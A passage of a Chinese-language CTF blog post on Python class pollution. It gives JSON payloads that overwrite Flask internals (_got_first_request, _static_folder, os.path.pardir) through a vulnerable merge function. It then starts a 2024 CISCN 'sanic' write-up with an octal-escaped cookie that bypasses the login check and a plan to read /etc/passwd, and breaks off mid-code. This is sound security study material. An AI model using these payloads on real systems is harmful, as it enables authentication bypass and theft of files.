_got_first_request:</h4>\n<pre><code>用于判定是否某次请求为子Flask启动后第一次请求，是Flask.got_first_request函数的返回值，此外还会影响装饰器app.before_first_request的调用，而_got_first_request值为假时才会调用：\n所以如果我们想调用第一次访问前的请求，还想要在后续请求中进行使用的话，我们就需要将_got_first_request从true改成false然后就能够在后续访问的过程中，仍然能够调用装饰器app.before_first_request下面的可用信息。\n</code></pre>\n<p>代码样例是：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span>request</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> json</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>app <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">,</span> dst<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\"># Recursive merge function</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> v <span class=\"token keyword\">in</span> src<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">hasattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> <span class=\"token string\">'__getitem__'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">if</span> dst<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                merge<span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">,</span> dst<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                dst<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">elif</span> <span class=\"token builtin\">hasattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            merge<span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">,</span> <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token builtin\">setattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">cls</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>instance <span class=\"token operator\">=</span> cls<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">\"Is flag here?\"</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>before_first_request</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">global</span> flag</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">hasattr</span><span class=\"token punctuation\">(</span>app<span class=\"token punctuation\">,</span> <span class=\"token string\">\"special\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> app<span class=\"token punctuation\">.</span>special <span class=\"token operator\">==</span> <span class=\"token string\">\"U_Polluted_It\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        flag <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span>methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'POST'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'GET'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        merge<span class=\"token punctuation\">(</span>json<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> instance<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">global</span> flag</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token builtin\">setattr</span><span class=\"token punctuation\">(</span>app<span class=\"token punctuation\">,</span> <span class=\"token string\">\"special\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"U_Polluted_It\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">return</span> flag</pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>host<span class=\"token operator\">=</span><span class=\"token string\">\"0.0.0.0\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token string\">\"__init__\"</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token string\">\"__globals__\"</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token string\">\"app\"</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                <span class=\"token string\">\"_got_first_request\"</span><span class=\"token punctuation\">:</span><span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>原因是</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>before_first_request</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">global</span> flag</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">hasattr</span><span class=\"token punctuation\">(</span>app<span class=\"token punctuation\">,</span> <span class=\"token string\">\"special\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> app<span class=\"token punctuation\">.</span>special <span class=\"token operator\">==</span> <span class=\"token string\">\"U_Polluted_It\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        flag <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h4 id=\"_static_url_path\"><a class=\"anchor\" href=\"#_static_url_path\">#</a> _static_url_path:</h4>\n<p>当 python 指定了 static 静态目录以后，我们再进行访问就会定向到 static 文件夹下面的对应文件而不会存在目录穿梭的漏洞，但是如果我们想要访问其他文件下面的敏感信息，我们就需要污染这个静态目录，让他自动帮我们实现定向</p>\n<pre><code>#static/index.html\n\n&lt;html&gt;\n&lt;h1&gt;hello&lt;/h1&gt;\n&lt;body&gt;    \n&lt;/body&gt;\n&lt;/html&gt;\n@app.route('/',methods=['POST', 'GET'])\ndef index():\n    if request.data:\n        merge(json.loads(request.data), instance)\n    return &quot;flag in ./flag but heres only static/index.html&quot;\npayload=&#123;\n    &quot;__init__&quot;:&#123;\n        &quot;__globals__&quot;:&#123;\n            &quot;app&quot;:&#123;\n                &quot;_static_folder&quot;:&quot;./&quot;\n            &#125;\n        &#125;\n    &#125;\n&#125;\n</code></pre>\n<h4 id=\"ospathpardir\"><a class=\"anchor\" href=\"#ospathpardir\">#</a> os.path.pardir:</h4>\n<p>套一下师傅的示例脚本来学习一下：</p>\n<pre><code>#app.py\n\nfrom flask import Flask,request\nimport json\n\napp = Flask(__name__)\n\ndef merge(src, dst):\n    # Recursive merge function\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n\nclass cls():\n    def __init__(self):\n        pass\n\ninstance = cls()\n\n@app.route('/',methods=['POST', 'GET'])\ndef index():\n    if request.data:\n        merge(json.loads(request.data), instance)\n    return &quot;flag in ./flag but heres only static/index.html&quot;\n\n\napp.run(host=&quot;0.0.0.0&quot;)\n</code></pre>\n<p>我们进行目录穿梭进行访问发现报了 500 的错误：</p>\n<p>是因为：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># pseudocode from jinja2/templating.py</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>sep <span class=\"token keyword\">in</span> filename <span class=\"token keyword\">or</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>pardir <span class=\"token keyword\">in</span> filename<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">raise</span> TemplateNotFound</pre></td></tr></table></figure><p>我们需要把  <code>os.path.pardir</code> （ <code>&quot;..&quot;</code> ）改成别的字符串，就绕过检测，模板引擎就会正常读取上级目录里的文件</p>\n<pre><code>payload:\n&#123;\n  &quot;__init__&quot;: &#123;\n    &quot;__globals__&quot;: &#123;\n      &quot;os&quot;: &#123;\n        &quot;path&quot;: &#123;\n          &quot;pardir&quot;: &quot;,&quot;    // 把 .. 换成 ,\n        &#125;\n      &#125;\n    &#125;\n  &#125;\n&#125;\n\n</code></pre>\n<p>就可以直接../../../flag 直接获取 flag 了</p>\n<h3 id=\"题目解析\"><a class=\"anchor\" href=\"#题目解析\">#</a> 题目解析</h3>\n<h4 id=\"2024ciscn-sanic\"><a class=\"anchor\" href=\"#2024ciscn-sanic\">#</a> 2024ciscn sanic</h4>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141911705.png\" alt=\"image-20250514191113540\" /></p>\n<p>给的提示：</p>\n<p>/admin 和 /src 的敏感目录</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> sanic <span class=\"token keyword\">import</span> Sanic</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> sanic<span class=\"token punctuation\">.</span>response <span class=\"token keyword\">import</span> text<span class=\"token punctuation\">,</span> html</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> sanic_session <span class=\"token keyword\">import</span> Session</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> pydash</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># pydash==5.1.2</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Pollute</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>app <span class=\"token operator\">=</span> Sanic<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>app<span class=\"token punctuation\">.</span>static<span class=\"token punctuation\">(</span><span class=\"token string\">\"/static/\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"./static/\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Session<span class=\"token punctuation\">(</span>app<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">async</span> <span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">return</span> html<span class=\"token punctuation\">(</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'static/index.html'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/login\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">async</span> <span class=\"token keyword\">def</span> <span class=\"token function\">login</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    user <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>cookies<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">if</span> user<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">'adm;n'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        request<span class=\"token punctuation\">.</span>ctx<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">[</span><span class=\"token string\">'admin'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">return</span> text<span class=\"token punctuation\">(</span><span class=\"token string\">\"login success\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">return</span> text<span class=\"token punctuation\">(</span><span class=\"token string\">\"login fail\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/src\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">async</span> <span class=\"token keyword\">def</span> <span class=\"token function\">src</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">return</span> text<span class=\"token punctuation\">(</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>__file__<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/admin\"</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">async</span> <span class=\"token keyword\">def</span> <span class=\"token function\">admin</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>ctx<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        key <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>json<span class=\"token punctuation\">[</span><span class=\"token string\">'key'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        value <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>json<span class=\"token punctuation\">[</span><span class=\"token string\">'value'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">if</span> key <span class=\"token keyword\">and</span> value <span class=\"token keyword\">and</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span> <span class=\"token keyword\">is</span> <span class=\"token builtin\">str</span> <span class=\"token keyword\">and</span> <span class=\"token string\">'_.'</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> key<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            pollute <span class=\"token operator\">=</span> Pollute<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            pydash<span class=\"token punctuation\">.</span>set_<span class=\"token punctuation\">(</span>pollute<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            <span class=\"token keyword\">return</span> text<span class=\"token punctuation\">(</span><span class=\"token string\">\"success\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            <span class=\"token keyword\">return</span> text<span class=\"token punctuation\">(</span><span class=\"token string\">\"forbidden\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">return</span> text<span class=\"token punctuation\">(</span><span class=\"token string\">\"forbidden\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>host<span class=\"token operator\">=</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>我们发现 /login 路由里面，当我们 cookie 穿的 user 的值为 adm;n 是，为给我们设置为 true，总所周知，cookie 中的；被视为分割符，正常传肯定失败，那我们就要去想想怎么绕过，</p>\n<p>既然是 sanic 的框架，我们就去搜 sanic 框架里的源码（cookies）</p>\n<p>发现在 sanic/cookies/request.py 中的_unquote 函数存在八进制解码的逻辑，且开头会去掉双引号于是我们找到了绕过的方法 “\\141\\144\\155\\073\\156”</p>\n<h5 id=\"绕过cookie将当分割符也可以adm073n\"><a class=\"anchor\" href=\"#绕过cookie将当分割符也可以adm073n\">#</a> 绕过 cookie 将；当分割符，也可以 adm\\073n</h5>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505151552790.png\" alt=\"image-20250515155219621\" /></p>\n<p>登陆成功</p>\n<h4 id=\"分析\"><a class=\"anchor\" href=\"#分析\">#</a> 分析：</h4>\n<p>然后主要的就是</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/src\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">async</span> <span class=\"token keyword\">def</span> <span class=\"token function\">src</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">return</span> text<span class=\"token punctuation\">(</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>__file__<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><pre><code>那么我们的目标就很明确了，我们得修改__file__的值，来读不同的文件，先试试/etc/passwd\n</code></pre>\n<p>但是得看代码是怎么写的</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/admin\"</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">async</span> <span class=\"token keyword\">def</span> <span class=\"token function\">admin</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>ctx<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        key <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>json<span class=\"token punctuation\">[</span><span class=\"token string\">'key'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        value <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>json<span class=\"token punctuation\">[</span><span class=\"token string\">'value'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span> key <span class=\"token keyword\">and</span> value <span class=\"token keyword\">and</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span> <span class=\"token keyword\">is</span> <span class=\"token builtin\">str</span> <span class=\"token keyword\">and</span> <span class=\"token string\">'_.'</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> key<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            pollute <span class=\"token operator\">=</span> Pollute<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            pydash<span class=\"token punctuation\">.</span>set_<span class=\"token punctuation\">(</span>pollute<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">return</span> text<span class=\"token punctuation\">(</span><span class=\"token string\">\"success\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">return</span> text<span class=\"token punctuation\">(</span><span class=\"token string\">\"forbidden\"</span><span class=\"token 